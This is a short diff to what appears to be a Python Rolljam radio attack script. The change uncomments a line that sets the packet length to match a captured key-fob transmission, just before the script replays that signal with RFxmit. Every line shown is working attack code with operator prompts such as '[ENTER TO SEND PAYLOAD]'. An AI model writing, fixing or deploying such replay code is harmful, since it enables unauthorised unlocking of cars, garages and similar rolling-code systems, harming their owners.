@@ -128,7 +128,7 @@ def main():
         if not auto:
             input("[ENTER TO SEND PAYLOAD]")
         print("[*] Rolljam enabled, so only sending first capture..\n")
-#        d.makePktFLEN(len(payloads[0]))
+        d.makePktFLEN(len(payloads[0]))
         d.RFxmit(payloads[0] + emptyKey)
         print("[PACKET SENT] Payload transmittion completed..\n")
 
